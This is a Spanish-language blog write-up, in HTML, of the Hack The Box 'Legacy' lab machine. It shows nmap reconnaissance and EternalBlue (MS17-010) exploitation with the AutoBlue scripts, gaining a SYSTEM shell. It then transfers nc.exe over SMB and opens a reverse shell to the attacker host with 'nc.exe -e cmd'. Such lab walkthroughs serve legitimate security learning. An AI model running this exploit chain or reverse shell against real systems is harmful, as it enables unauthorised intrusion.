@@ -1,0 +1,610 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box Legacy - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina Legacy en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box Legacy">
+<meta property="og:url" content="http://localhost:4000/htb-legacy/">
+
+
+  <meta property="og:description" content="Resolución de la máquina Legacy en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-legacy/legacy.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-09-06T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-legacy/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >Contacto</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box Legacy</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Inteligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box Legacy">
+    <meta itemprop="description" content="Resolución de la máquina Legacy en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="September 06, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Legacy
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-09-06T00:00:00-05:00">September 06, 2021 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-legacy/banner-legacy.jpg" alt="" /></p>
+
+<h2 id="legacy">Legacy</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.4.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.4
+PING 10.10.10.4 <span class="o">(</span>10.10.10.4<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.4: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>145 ms
+
+<span class="nt">---</span> 10.10.10.4 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 145.076/145.076/145.076/0.000 ms
+
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">--open</span> <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.4 <span class="nt">-oG</span> allPorts
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-27 22:23 CDT
+Initiating SYN Stealth Scan at 22:23
+Scanning 10.10.10.4 <span class="o">[</span>65535 ports]
+Discovered open port 139/tcp on 10.10.10.4
+Discovered open port 445/tcp on 10.10.10.4
+Completed SYN Stealth Scan at 22:24, 26.44s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.4
+Host is up, received user-set <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2021-08-27 22:23:35 CDT <span class="k">for </span>26s
+Not shown: 65532 filtered ports, 1 closed port
+Reason: 65532 no-responses and 1 reset
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT    STATE SERVICE      REASON
+139/tcp open  netbios-ssn  syn-ack ttl 127
+445/tcp open  microsoft-ds syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>26.62 seconds
+           Raw packets sent: 131085 <span class="o">(</span>5.768MB<span class="o">)</span> | Rcvd: 21 <span class="o">(</span>920B<span class="o">)</span>
+
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.4
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 139,445
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+   8   │ 
+
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p139</span>,445 10.10.10.4 <span class="nt">-oN</span> targeted
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-27 22:26 CDT
+Nmap scan report <span class="k">for </span>10.10.10.4
+Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT    STATE SERVICE      VERSION
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Windows XP microsoft-ds
+Service Info: OSs: Windows, Windows XP<span class="p">;</span> CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+
+Host script results:
+|_clock-skew: mean: 5d00h32m17s, deviation: 2h07m16s, median: 4d23h02m17s
+|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:1f:58 <span class="o">(</span>VMware<span class="o">)</span>
+| smb-os-discovery: 
+|   OS: Windows XP <span class="o">(</span>Windows 2000 LAN Manager<span class="o">)</span>
+|   OS CPE: cpe:/o:microsoft:windows_xp::-
+|   Computer name: legacy
+|   NetBIOS computer name: LEGACY<span class="se">\x</span>00
+|   Workgroup: HTB<span class="se">\x</span>00
+|_  System <span class="nb">time</span>: 2021-09-02T08:29:19+03:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+|_smb2-time: Protocol negotiation failed <span class="o">(</span>SMB2<span class="o">)</span>
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>59.41 seconds
+</code></pre></div></div>
+
+<p>Observamos que se encuentra abierto el puerto 445/TCP, por lo que procedemos a validar si es vulnerable al <strong>Eternal Blue</strong>. Descargamos el repositorio AutoBlue-MS17-010 y primeramente, ejecutarmos el archivo <code class="language-plaintext highlighter-rouge">eternal_checker.py</code>.</p>
+
+<p><a href="https://github.com/3ndG4me/AutoBlue-MS17-010">AutoBlue-MS17-010</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ git clone https://github.com/3ndG4me/AutoBlue-MS17-010
+Clonando en <span class="s1">'AutoBlue-MS17-010'</span>...
+remote: Enumerating objects: 126, <span class="k">done</span><span class="nb">.</span>
+remote: Counting objects: 100% <span class="o">(</span>50/50<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+remote: Compressing objects: 100% <span class="o">(</span>15/15<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+remote: Total 126 <span class="o">(</span>delta 40<span class="o">)</span>, reused 35 <span class="o">(</span>delta 35<span class="o">)</span>, pack-reused 76
+Recibiendo objetos: 100% <span class="o">(</span>126/126<span class="o">)</span>, 94.22 KiB | 945.00 KiB/s, listo.
+Resolviendo deltas: 100% <span class="o">(</span>74/74<span class="o">)</span>, listo.
+❯ <span class="nb">cd </span>AutoBlue-MS17-010/
+❯ python eternal_checker.py 10.10.10.4
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target OS: Windows 5.1
+<span class="o">[!]</span> The target is not patched
+<span class="o">===</span> Testing named pipes <span class="o">===</span>
+<span class="o">[</span>+] Found pipe <span class="s1">'browser'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Done
+
+</code></pre></div></div>
+
+<p>Con esto validamos que la máquina es vulnerable al exploit, por tanto se procede a ejecutar:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python zzz_exploit.py <span class="nt">-target-ip</span> 10.10.10.4 <span class="nt">-port</span> 445 10.10.10.4
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target OS: Windows 5.1
+<span class="o">[</span>+] Found pipe <span class="s1">'browser'</span>
+<span class="o">[</span>+] Using named pipe: browser
+Groom packets
+attempt controlling next transaction on x86
+success controlling one transaction
+modify parameter count to 0xffffffff to be able to write backward
+leak next transaction
+CONNECTION: 0x821a9da8
+SESSION: 0xe20e3190
+FLINK: 0x7bd48
+InData: 0x7ae28
+MID: 0xa
+TRANS1: 0x78b50
+TRANS2: 0x7ac90
+modify transaction struct <span class="k">for </span>arbitrary <span class="nb">read</span>/write
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> make this SMB session to be SYSTEM
+<span class="o">[</span>+] current TOKEN addr: 0xe1bc7030
+userAndGroupCount: 0x3
+userAndGroupsAddr: 0xe1bc70d0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> overwriting token UserAndGroups
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> have fun with the system smb session!
+<span class="o">[!]</span> Dropping a semi-interactive shell <span class="o">(</span>remember to escape special chars with ^<span class="o">)</span> 
+<span class="o">[!]</span> Executing interactive programs will hang shell!
+C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<p>Para manejarnos mejor, establecemos una nueva conexión, en caso que en el programa nos bote. Primero nos transferimos el programa <strong>nc.exe</strong>, nos ponemos en escucha por el puerto 443 y procedemos a ejecutar el archivo estableciendo la conexión.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;mkdir C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\t</span>est
+
+C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;copy <span class="se">\\</span>10.10.14.15<span class="se">\s</span>mbFolder<span class="se">\n</span>c.exe C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\t</span>est<span class="se">\n</span>c.exe
+        1 file<span class="o">(</span>s<span class="o">)</span> copied.
+
+C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;
+C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\t</span>est<span class="se">\n</span>c.exe <span class="nt">-e</span> cmd 10.10.14.15 443
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.4,1045<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>LEGACY<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User LEGACY<span class="se">\ </span>authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
+<span class="o">[</span>-] Unknown level <span class="k">for </span>query path info! 0x109
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.10.10.4,1045<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remaining connections <span class="o">[]</span>
+
+❯ rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.15] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.4] 1048
+Microsoft Windows XP <span class="o">[</span>Version 5.1.2600]
+<span class="o">(</span>C<span class="o">)</span> Copyright 1985-2001 Microsoft Corp.
+
+C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;
+
+</code></pre></div></div>
+
+<p>Con esta conexión ya podemos movernos con mayor facilidad. Ya somos administradores del equipo y podemos visualizar las flags (user.txt y root.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#injection" class="page__taxonomy-item" rel="tag">Injection</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-09-06T00:00:00-05:00">September 06, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/extractPorts/" class="pagination--pager" title="Función extractPorts
+">Previous</a>
+    
+    
+      <a href="/htb-love/" class="pagination--pager" title="Hack The Box Love
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
